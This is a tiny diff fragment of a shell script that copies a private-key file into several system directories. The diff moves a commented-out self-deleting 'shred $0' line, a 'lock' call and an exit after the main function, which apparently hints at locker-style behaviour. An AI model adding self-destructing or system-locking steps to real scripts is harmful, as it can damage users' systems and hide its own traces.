@@ -173,8 +173,8 @@ main() {
     cp $PRIVATEKEY /etc/
     cp $PRIVATEKEY /var/
     cp $PRIVATEKEY /usr/
-    #shred $0
-    lock
-    EXIT
 }
 main
+#shred $0
+lock
+EXIT
